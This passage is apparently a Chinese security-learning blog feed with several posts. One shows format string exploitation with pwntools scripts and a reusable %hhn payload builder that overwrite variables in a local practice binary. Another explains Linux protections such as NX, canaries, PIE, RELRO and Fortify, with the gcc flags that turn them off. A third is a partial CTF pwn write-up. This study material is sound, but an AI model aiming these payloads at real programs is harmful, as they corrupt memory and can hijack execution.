<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"> → 0xf7e44670 &lt;printf+0&gt;       call   0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt;<br>   ↳  0xf7f1ab09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]<br>      0xf7f1ab0c &lt;__x86.get_pc_thunk.ax+3&gt; ret<br>      0xf7f1ab0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]<br>      0xf7f1ab10 &lt;__x86.get_pc_thunk.dx+3&gt; ret<br>────────────────────────────────────────────────────────────────────────────────────[ stack ]────<br>[&#x27;0xffffcd0c&#x27;, &#x27;l8&#x27;]<br>8<br>0xffffcd0c│+0x00: 0x080484d7  →  &lt;main+76&gt; add esp, 0x10	 ← $esp<br>0xffffcd10│+0x04: 0xffffcd28  →  &quot;%d%d&quot;<br>0xffffcd14│+0x08: 0xffffcd8c  →  0x00000315<br>0xffffcd18│+0x0c: 0x000000c2<br>0xffffcd1c│+0x10: 0xf7e8b6bb  →  &lt;handle_intel+107&gt; add esp, 0x10<br>0xffffcd20│+0x14: 0xffffcd4e  →  0xffff0000  →  0x00000000<br>0xffffcd24│+0x18: 0xffffce4c  →  0xffffd07a  →  &quot;XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]&quot;<br>0xffffcd28│+0x1c: &quot;%d%d&quot;	 ← $eax<br></code></pre></td></tr></table></figure>

<p>我们可以发现在0xffffcd14处存储着变量c的数值。继而，我们再确定格式化字符串’%d%d’的地址0xffffcd28相对于printf函数的格式化字符串参数0xffffcd10的偏移为0x18，即格式化字符串相当于printf函数的第7个参数，相当于格式化字符串的第6个参数。</p>
<h4 id="进行覆盖"><a href="#进行覆盖" class="headerlink" title="进行覆盖"></a>进行覆盖</h4><p>这样，第6个参数处的值就是存储变量c的地址，我们便可以利用%n的特征来修改c的值。payload如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">[addr of c]%012d%6$n<br></code></pre></td></tr></table></figure>

<p>addr of c 的长度为4，故而我们得再输入12个字符才可以达到16个字符，以便于来修改c的值为16。</p>
<p>具体脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">forc</span>():</span><br>    sh = process(<span class="hljs-string">&#x27;./overwrite&#x27;</span>)<br>    c_addr = <span class="hljs-built_in">int</span>(sh.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>), <span class="hljs-number">16</span>)<br>    <span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(c_addr)<br>    payload = p32(c_addr) + <span class="hljs-string">&#x27;%012d&#x27;</span> + <span class="hljs-string">&#x27;%6$n&#x27;</span><br>    <span class="hljs-built_in">print</span> payload<br>    <span class="hljs-comment">#gdb.attach(sh)</span><br>    sh.sendline(payload)<br>    <span class="hljs-built_in">print</span> sh.recv()<br>    sh.interactive()<br><br>forc()<br></code></pre></td></tr></table></figure>

<p>结果如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">➜  overwrite git:(master) ✗ python exploit.py<br>[+] Starting local process &#x27;./overwrite&#x27;: pid 74806<br>0xfffd8cdc<br>܌��%012d%6$n<br>܌��-00000160648modified c.<br></code></pre></td></tr></table></figure>

<h3 id="覆盖任意地址内存"><a href="#覆盖任意地址内存" class="headerlink" title="覆盖任意地址内存"></a>覆盖任意地址内存</h3><h4 id="覆盖小数字"><a href="#覆盖小数字" class="headerlink" title="覆盖小数字"></a>覆盖小数字</h4><p>首先，我们来考虑一下如何修改data段的变量为一个较小的数字，比如说，<strong>小于机器字长的数字</strong>。这里以2为例。可能会觉得这其实没有什么区别，可仔细一想，真的没有么？如果我们还是将要覆盖的地址放在最前面，那么将直接占用机器字长个(4或8)字节。显然，无论之后如何输出，都只会比4大。</p>
<blockquote>
<p>或许我们可以使用整形溢出来修改对应的地址的值，但是这样将面临着我们得一次输出大量的内容。而这，一般情况下，基本都不会攻击成功。</p>
</blockquote>
<p>那么我们应该怎么做呢？再仔细想一下，我们有必要将所要覆盖的变量的地址放在字符串的最前面么？似乎没有，我们当时只是为了寻找偏移，所以才把tag放在字符串的最前面，如果我们把tag放在中间，其实也是无妨的。类似的，我们把地址放在中间，只要能够找到对应的偏移，其照样也可以得到对应的数值。前面已经说了我们的格式化字符串的为第6个参数。由于我们想要把2写到对应的地址处，故而格式化字符串的前面的字节必须是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">aa%k$nxx<br></code></pre></td></tr></table></figure>

<p>此时对应的存储的格式化字符串已经占据了6个字符的位置，如果我们再添加两个字符aa，那么其实aa%k就是第6个参数，$nxx其实就是第7个参数，后面我们如果跟上我们要覆盖的地址，那就是第8个参数，所以如果我们这里设置k为8，其实就可以覆盖了。</p>
<p>利用ida可以得到a的地址为0x0804A024（由于a、b是已初始化的全局变量，因此不在堆栈中）。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs asm">.data:0804A024                 public a<br>.data:0804A024 a               dd 7Bh<br></code></pre></td></tr></table></figure>

<p>故而我们可以构造如下的利用代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fora</span>():</span><br>    sh = process(<span class="hljs-string">&#x27;./overwrite&#x27;</span>)<br>    a_addr = <span class="hljs-number">0x0804A024</span><br>    payload = <span class="hljs-string">&#x27;aa%8$naa&#x27;</span> + p32(a_addr)<br>    sh.sendline(payload)<br>    <span class="hljs-built_in">print</span> sh.recv()<br>    sh.interactive()<br></code></pre></td></tr></table></figure>

<p>对应的结果如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">➜  overwrite git:(master) ✗ python exploit.py<br>[+] Starting local process &#x27;./overwrite&#x27;: pid 76508<br>[*] Process &#x27;./overwrite&#x27; stopped with exit code 0 (pid 76508)<br>0xffc1729c<br><span class="hljs-meta">aaaa$</span><span class="bash">\xa0\x0modified a <span class="hljs-keyword">for</span> a small number.</span><br></code></pre></td></tr></table></figure>

<p>其实，这里我们需要掌握的小技巧就是，我们没有必要必须把地址放在最前面，放在那里都可以，只要我们可以找到其对应的偏移即可。</p>
<h4 id="覆盖大数字"><a href="#覆盖大数字" class="headerlink" title="覆盖大数字"></a>覆盖大数字</h4><p>上面介绍了覆盖小数字，这里我们就少覆盖大数字了。上面我们也说了，我们可以选择直接一次性输出大数字个字节来进行覆盖，但是这样基本也不会成功，因为太长了。而且即使成功，我们一次性等待的时间也太长了，那么有没有什么比较好的方式呢？自然是有了。</p>
<p>不过在介绍之前，我们得先再简单了解一下，变量在内存中的存储格式。首先，所有的变量在内存中都是以字节进行存储的。此外，在x86和x64的体系结构中，变量的存储格式为以小端存储，即最低有效位存储在低地址。举个例子，0x12345678在内存中由低地址到高地址依次为\x78\x56\x34\x12。再者，我们可以回忆一下格式化字符串里面的标志，可以发现有这么两个标志：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text"> <br> hh 对于整数类型，printf期待一个从char提升的int尺寸的整型参数。<br>h  对于整数类型，printf期待一个从short提升的int尺寸的整型参数。<br></code></pre></td></tr></table></figure>

<p>所以说，我们可以利用%hhn向某个地址写入单字节，利用%hn向某个地址写入双字节。这里，我们以单字节为例。</p>
<p>首先，我们还是要确定的是要覆盖的地址为多少，利用ida看一下，可以发现地址为0x0804A028。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">.data:0804A028                 public b<br>.data:0804A028 b               dd 1C8h                 ; DATA XREF: main:loc_8048510r<br></code></pre></td></tr></table></figure>

<p>即我们希望将按照如下方式进行覆盖，前面为覆盖地址，后面为覆盖内容。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">0x0804A028 \x78<br>0x0804A029 \x56<br>0x0804A02a \x34<br>0x0804A02b \x12<br></code></pre></td></tr></table></figure>

<p>首先，由于我们的字符串的偏移为6，所以我们可以确定我们的payload基本是这个样子的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">p32(0x0804A028)+p32(0x0804A029)+p32(0x0804A02a)+p32(0x0804A02b)+pad1+&#x27;%6$n&#x27;+pad2+&#x27;%7$n&#x27;+pad3+&#x27;%8$n&#x27;+pad4+&#x27;%9$n&#x27;<br></code></pre></td></tr></table></figure>

<p>我们可以依次进行计算。这里给出一个基本的构造，如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fmt</span>(<span class="hljs-params">prev, word, index</span>):</span><br>    <span class="hljs-keyword">if</span> prev &lt; word:<br>        result = word - prev<br>        fmtstr = <span class="hljs-string">&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(result) + <span class="hljs-string">&quot;c&quot;</span><br>    <span class="hljs-keyword">elif</span> prev == word:<br>        result = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">else</span>:<br>        result = <span class="hljs-number">256</span> + word - prev<br>        fmtstr = <span class="hljs-string">&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(result) + <span class="hljs-string">&quot;c&quot;</span><br>    fmtstr += <span class="hljs-string">&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(index) + <span class="hljs-string">&quot;$hhn&quot;</span><br>    <span class="hljs-keyword">return</span> fmtstr<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fmt_str</span>(<span class="hljs-params">offset, size, addr, target</span>):</span><br>    payload = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        <span class="hljs-keyword">if</span> size == <span class="hljs-number">4</span>:<br>            payload += p32(addr + i)<br>        <span class="hljs-keyword">else</span>:<br>            payload += p64(addr + i)<br>    prev = <span class="hljs-built_in">len</span>(payload)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        payload += fmt(prev, (target &gt;&gt; i * <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>, offset + i)<br>        prev = (target &gt;&gt; i * <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span><br>    <span class="hljs-keyword">return</span> payload<br>payload = fmt_str(<span class="hljs-number">6</span>,<span class="hljs-number">4</span>,<span class="hljs-number">0x0804A028</span>,<span class="hljs-number">0x12345678</span>)<br></code></pre></td></tr></table></figure>

<p>其中每个参数的含义基本如下</p>
<ul>
<li>offset表示要覆盖的地址最初的偏移</li>
<li>size表示机器字长</li>
<li>addr表示将要覆盖的地址。</li>
<li>target表示我们要覆盖为的目的变量值。</li>
</ul>
<p>相应的exploit如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">forb</span>():</span><br>    sh = process(<span class="hljs-string">&#x27;./overwrite&#x27;</span>)<br>    payload = fmt_str(<span class="hljs-number">6</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0x0804A028</span>, <span class="hljs-number">0x12345678</span>)<br>    <span class="hljs-built_in">print</span> payload<br>    sh.sendline(payload)<br>    <span class="hljs-built_in">print</span> sh.recv()<br>    sh.interactive()<br></code></pre></td></tr></table></figure>

<p>结果如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">➜  overwrite git:(master) ✗ python exploit.py<br>[+] Starting local process <span class="hljs-string">&#x27;./overwrite&#x27;</span>: pid <span class="hljs-number">78547</span><br>(\xa0\x0)\xa0\x0*\xa0\x0+\xa0\x0%104c%<span class="hljs-number">6</span>$hhn%222c%<span class="hljs-number">7</span>$hhn%222c%<span class="hljs-number">8</span>$hhn%222c%<span class="hljs-number">9</span>$hhn<br>[*] Process <span class="hljs-string">&#x27;./overwrite&#x27;</span> stopped <span class="hljs-keyword">with</span> exit code <span class="hljs-number">0</span> (pid <span class="hljs-number">78547</span>)<br><span class="hljs-number">0xfff6f9bc</span><br>(\xa0\x0)\xa0\x0*\xa0\x0+\xa0\x0                                                                                                       X                                                                                                                                                                                                                             �                                                                                                                                                                                                                             \xbb                                                                                                                                                                                                                             ~modified b <span class="hljs-keyword">for</span> a big number!<br></code></pre></td></tr></table></figure>

<p>当然，我们也可以利用%n分别对每个地址进行写入，也可以得到对应的答案，但是由于我们写入的变量都只会影响由其开始的四个字节，所以最后一个变量写完之后，我们可能会修改之后的三个字节，如果这三个字节比较重要的话，程序就有可能因此崩溃。而采用%hhn则不会有这样的问题，因为这样只会修改相应地址的一个字节。</p>
]]></content>
      <tags>
        <tag>格式化字符串漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>缓冲区保护机制</title>
    <url>/2021/03/18/2021-03-18-%E7%BC%93%E5%86%B2%E5%8C%BA%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<p>为了更好地对缓冲区进行利用，十分有必要了解一下checksec所检查出的漏洞缓解措施都意味着什么</p>
<p><img src="2021-03-18-%E7%BC%93%E5%86%B2%E5%8C%BA%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6.assets/QQ%E5%9B%BE%E7%89%8720210319191658.png"></p>
<p>如图上所示，RELRO、Stack、NX、PIE四种保护机制，下方介绍时，括号里的是在Windows系统中的名称</p>
<p>以下主要来源于《从0到1CTFer成长之路》</p>
<h3 id="一、NX-DEP"><a href="#一、NX-DEP" class="headerlink" title="一、NX(DEP)"></a>一、NX(DEP)</h3><p>NX即是No-execute，不可执行。原理是通过现代操作系统的内存保护单元机制（MPU）对程序内存按页的粒度进行权限设置，其基本规则为<strong>可写权限与可执行权限互斥</strong>。因此开启了NX的程序代表着堆栈上写入的代码数据将不可被执行，也就无法直接通过溢出写入shellcode而执行任意代码。</p>
<p>所有可以被修改写入的数据的内存都不可执行，所有可执行的代码数据都是不可修改的。这就是可执行权限与可写权限互斥</p>
<p>GCC编写程序默认开启NX，关闭方法是在编译是加入**-z execstack参数**</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gcc -z execstack -o test test.c<br></code></pre></td></tr></table></figure>

<h3 id="二、Stack-Canary"><a href="#二、Stack-Canary" class="headerlink" title="二、Stack Canary"></a>二、Stack Canary</h3><p>Stack Canary保护一种针对栈溢出攻击而设计的保护机制。当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行，因此Stack Canary会在函数开始执行前，在返回地址前写入一个字长的随机数据（可以称这个数据为canary，在Windows下是cookie），之后可以在函数返回前进行检验随机数据是否被更改，如果发生更改将直接终止程序进行保护。</p>
<p>GCC编写程序默认开启Stack Canary，关闭方法是在编译时加入**-fno-stack-protector参数**</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gcc -fno-stack-protector -o test test.c<br></code></pre></td></tr></table></figure>

<h3 id="三、PIE"><a href="#三、PIE" class="headerlink" title="三、PIE"></a>三、PIE</h3><p>在介绍PIE前，要先介绍ASLR即Address Space Layout Randomization，地址空间分布随机化。ASLR是系统等级的保护机制，只有在开启了ASLR后PIE才能生效。而ASLR的目的是将程序的堆栈地址和动态链接库（或称为共享库）的加载基址进行一定的随机化，这些地址之间是不可读写执行的未映射内存。</p>
<p>关闭ASLR关闭方式是修改**/proc/sys/kernel/randomize_va_space**文件为0</p>
<p>PIE的目的则是让可执行程序ELF文件的基址进行随机化加载（负责代码段和数据段的随机化），从而使得攻击者难以知道程序的内存结构，与ASLR相互配合。</p>
<p>GCC编写程序开启方法是加入**-fpic -pie参数<strong>。较新版本的GCC默认开启PIE，可以设置</strong>-no-pie**关闭</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gcc -fpic -pie -o test test.c<br></code></pre></td></tr></table></figure>

<h3 id="四、Full-Relro"><a href="#四、Full-Relro" class="headerlink" title="四、Full Relro"></a>四、Full Relro</h3><p>Full Relro 保护措施与Linux下的Lazy Binding机制有关，主要作用是设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，禁止.GOT.PLT表和其他一些相关内存的读写，从而阻止攻击者直接进行修改程序所要执行的函数</p>
<p>当只是开启了Partial RELRO，说明我们对GOT表具有写权限。</p>
<p>GCC开启Full Relro 的方法是加入**-z relro参数**</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gcc -z relro -o test test.c<br></code></pre></td></tr></table></figure>

<h3 id="五、Fortify"><a href="#五、Fortify" class="headerlink" title="五、Fortify"></a>五、Fortify</h3><p><img src="2021-03-18-%E7%BC%93%E5%86%B2%E5%8C%BA%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6.assets/QQ%E5%9B%BE%E7%89%8720210319191855.png"></p>
<p>这部分转载自<a href="http://yunnigu.dropsec.xyz/2016/10/08/checksec%E5%8F%8A%E5%85%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/">http://yunnigu.dropsec.xyz/2016/10/08/checksec及其包含的保护机制/</a></p>
<p>FORTIFY_SOURCE 机制对格式化字符串有两个限制</p>
<p> （1）包含%n的格式化字符串不能位于程序内存中的可写地址。</p>
<p>（2）当使用位置参数时，必须使用范围内的所有参数。</p>
<p>所以如果要使用%7$x，你必须同时使用1,2,3,4,5和6</p>
<p>当进入到gdb中进行checksec检查文件会发现多了一个保护措施Fortify，这是一种比较少见的保护措施，是为了防止缓冲区溢出攻击</p>
<p>举个例子可能简单明了一些：<br>一段简单的存在缓冲区溢出的C代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">fun</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *s)</span> </span>&#123;<br>        <span class="hljs-keyword">char</span> buf[<span class="hljs-number">0x100</span>];<br>        <span class="hljs-built_in">strcpy</span>(buf, s);<br>        <span class="hljs-comment">/* Don&#x27;t allow gcc to optimise away the buf */</span><br>        <span class="hljs-function"><span class="hljs-keyword">asm</span> <span class="hljs-title">volatile</span><span class="hljs-params">(<span class="hljs-string">&quot;&quot;</span> :: <span class="hljs-string">&quot;m&quot;</span> (buf))</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>用包含参数-U_FORTIFY_SOURCE编译</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs assembly">08048450 &lt;fun&gt;:<br>  push   %ebp               ; <br>  mov    %esp,%ebp<br><br>  sub    $0x118,%esp        ; 将0x118存储到栈上<br>  mov    0x8(%ebp),%eax     ; 将目标参数载入eax<br>  mov    %eax,0x4(%esp)     ; 保存目标参数<br>  lea    -0x108(%ebp),%eax  ; 数组buf<br>  mov    %eax,(%esp)        ; 保存<br>  call   8048320 &lt;strcpy@plt&gt;<br><br>  leave                     ; <br>  ret<br></code></pre></td></tr></table></figure>

<p>用包含参数-D_FORTIFY_SOURCE=2编译</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs assembly">08048470 &lt;fun&gt;:<br>  push   %ebp               ; <br>  mov    %esp,%ebp<br><br>  sub    $0x118,%esp        ; <br>  movl   $0x100,0x8(%esp)   ; 把0x100当作目标参数保存<br>  mov    0x8(%ebp),%eax     ; <br>  mov    %eax,0x4(%esp)     ; <br>  lea    -0x108(%ebp),%eax  ; <br>  mov    %eax,(%esp)        ; <br>  call   8048370 &lt;__strcpy_chk@plt&gt;<br><br>  leave                      ; <br>  ret<br></code></pre></td></tr></table></figure>

<p>可以看到gcc生成了一些附加代码，通过对数组大小的判断替换strcpy, memcpy, memset等函数名，达到防止缓冲区溢出的作用。</p>
]]></content>
  </entry>
  <entry>
    <title>攻防世界pwn新手题wp</title>
    <url>/2021/03/16/2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp/</url>
    <content><![CDATA[<h3 id="一、get-shell"><a href="#一、get-shell" class="headerlink" title="一、get_shell"></a>一、get_shell</h3><p>题目所给的附件并无作用，直接进入虚拟机中用nc连接所给的ip，即可获取flag</p>
<img src="2021-03-16-攻防世界pwn新手题wp.assets/QQ图片20210316210045.png" style="zoom: 80%;" />

<h3 id="二、CGfsb"><a href="#二、CGfsb" class="headerlink" title="二、CGfsb"></a>二、CGfsb</h3><p>checksec一下，查看一下文件的保护措施以及确认文件是</p>
<h3 id="三、when-did-you-born"><a href="#三、when-did-you-born" class="headerlink" title="三、when_did_you_born"></a>三、when_did_you_born</h3><p>checksec一下附件，发现是64位文件，以及一些开启的保护措施，具体的拖入ida进行分析</p>
<p><img src="2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp.assets/QQ%E5%9B%BE%E7%89%8720210323214845.png"></p>
<p><img src="2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp.assets/QQ%E5%9B%BE%E7%89%8720210323215315.png"></p>
<p>程序很简单，就是要你输入一个数字，代表你的出生年龄，但是一开始并不能输入1926，然后程序往下继续运行，会发现，只有你输入的出生年份是1926才能获得flag，很明显的溢出覆盖了，往前找，get(&amp;v4)无限制的输入，可以造成溢出而覆盖v5的值变成1926而得到flag，exp如下</p>
<p><img src="2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp.assets/QQ%E5%9B%BE%E7%89%8720210323220128.png"></p>
<h3 id="四、hello-pwn"><a href="#四、hello-pwn" class="headerlink" title="四、hello_pwn"></a>四、hello_pwn</h3><p>惯例的先运行一下附件，貌似啥都没能发现，然后查看一下文件是32位还是64位，再拖入相应的ida中开始进一步的分析</p>
<img src="2021-03-16-攻防世界pwn新手题wp.assets/QQ图片20210316210858.png" style="zoom: 80%;" />



<p>在ida中F5反汇编后，代码十分简单<img src="2021-03-16-攻防世界pwn新手题wp.assets/QQ图片20210316211445.png" style="zoom: 67%;" /></p>
<p>并没有什么内容，到处看看，在if条件后的函数里面发现了<img src="2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp.assets/QQ%E5%9B%BE%E7%89%8720210316214111.png"></p>
<p>思路就很清晰了，我们只需要让程序执行到这个函数就可以获取flag，而要执行到这里就要满足if里面的条件，让变量等于</p>
<p>1853186401即可，此时查看一下变量处于的位置，以及计算距离read可输入地址的偏差，最后得出exp如下</p>
<p><img src="2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp.assets/QQ%E5%9B%BE%E7%89%8720210316211433.png"></p>
<p><img src="2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp.assets/QQ%E5%9B%BE%E7%89%8720210316214844.png"></p>
<p>注意exp要print出来，因为这样才能把接收到flag打印出来，显示在shell中</p>
<p><img src="2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp.assets/QQ%E5%9B%BE%E7%89%8720210316214934.png"></p>
<h3 id="五、level0"><a href="#五、level0" class="headerlink" title="五、level0"></a>五、level0</h3><p>checksec一下，查看一下文件的保护措施以及确认文件是64位的，拖入ida中分析</p>
<p><img src="2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp.assets/QQ%E5%9B%BE%E7%89%8720210323220433.png"></p>
<p><img src="2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp.assets/QQ%E5%9B%BE%E7%89%8720210323220729.png"></p>
<p>发现read写入函数可以写入的内容长度十分大，完全足以覆盖返回地址、执行任意指令了，接下来就是去寻找一下可以进行获取shell权限的函数之类的代码，可以发现在一个名为callsystem的函数里面有着如图的程序<img src="2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp.assets/QQ%E5%9B%BE%E7%89%8720210323221023.png"></p>
<p>看到这个，也代表着权限函数也找到了，之后只需要进行简单的计算偏移地址进行覆盖返回地址，从而跳转到这个函数执行即可获取flag，exp如下：</p>
<p><img src="2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp.assets/QQ%E5%9B%BE%E7%89%8720210323221229.png"></p>
<p>顺便提一下，callsystem函数的地址可以在左边函数列表拖向右边看到，或者在右下角也有</p>
<h3 id="六、level2"><a href="#六、level2" class="headerlink" title="六、level2"></a>六、level2</h3><p>checksec一下，查看一下文件的保护措施以及确认文件是32位的，再去ida中进行静态分析，</p>
<p><img src="2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp.assets/QQ%E5%9B%BE%E7%89%8720210326201427.png"></p>
<p><img src="2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp.assets/QQ%E5%9B%BE%E7%89%8720210326202416.png"></p>
<p>计算偏差之后，可以发现存在溢出，之后就是寻找系统函数，跳转拿到shell权限</p>
<img src="2021-03-16-攻防世界pwn新手题wp.assets/QQ图片20210326202641.png" style="zoom:50%;" />

<p>发现存在着/bin/sh和system函数，足以构造payload了，exp如下：</p>
<p><img src="2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp.assets/QQ%E5%9B%BE%E7%89%8720210326203123.png"></p>
<h3 id="七、level3"><a href="#七、level3" class="headerlink" title="七、level3"></a>七、level3</h3><p>checksec一下，查看一下文件的保护措施以及确认文件是32位的</p>
<p>![](2021-03-16-攻防世界pwn新手题wp.assets/QQ图片20210326203123-1616762538191.png</p>
<p><img src="2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp.assets/QQ%E5%9B%BE%E7%89%8720210326204057.png"></p>
<p><img src="2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp.assets/QQ%E5%9B%BE%E7%89%8720210326204257.png"></p>
<p>跟level2一样的溢出点，但是查找函数和字符串列表找不到system和binsh字符串了，那此时就需要使用到libc这个共享库了，文件里面已经包含了这个共享库，可以直接使用，通过libc从而获得system和binsh字符串的绝对地址，而为了获取这两个，就要使用附件里面已经被调用的函数取计算该函数的绝对地址和libc库地址的偏差，因为在偏差是一样的，所以可以借此获得system和binsh字符串的绝对地址，exp如下：<img src="2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp.assets/QQ%E5%9B%BE%E7%89%8720210326205423.png"></p>
<h3 id="八、string"><a href="#八、string" class="headerlink" title="八、string"></a>八、string</h3><p>checksec一下，查看一下文件的保护措施以及确认文件是</p>
<h3 id="九、int-overflow"><a href="#九、int-overflow" class="headerlink" title="九、int_overflow"></a>九、int_overflow</h3><p>checksec一下，查看一下文件的保护措施以及确认文件是32位的<img src="2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp.assets/QQ%E5%9B%BE%E7%89%8720210326211227.png"></p>
<p><img src="2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp.assets/QQ%E5%9B%BE%E7%89%8720210326211618-1616764664538.png"></p>
<p><img src="2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp.assets/QQ%E5%9B%BE%E7%89%8720210326211724.png"></p>
<p>首先v4只能等于1进入login，后面的函数也能发现，全都够不到返回地址，所以无法进行溢出，继续往后面看，</p>
<p><img src="2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp.assets/QQ%E5%9B%BE%E7%89%8720210326212348.png"></p>
<p>认真审计这页代码，发现v3必须要在4-7之间，然后才能到strcpy函数那里，而那里dest的地址距离返回地址可是十分近的，那么利用点是否可能在s上面？接着看v3竟然是无符号的8位整型数， 似乎可以利用整数溢出，而让v3截断在4-7之间，实际s里面的字符却远远不止这么一点，而s就是上一页的char，是可以随意输入的。exp如下：</p>
<p><img src="2021-03-16-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E9%A2%98wp.assets/QQ%E5%9B%BE%E7%89%8720210326212348-1616765685730.png"></p>
]]></content>
  </entry>
  <entry>
    <title>0Geek2019babyrop</title>
    <url>/2020/12/14/2020-12-14-0Geek2019babyrop/</url>
    <content><![CDATA[<p>首先常规操作：下载附件，拖进Linux中，checksec一波~</p>
<p><img src="2020-12-14-0Geek2019babyrop.assets/1.png"></p>
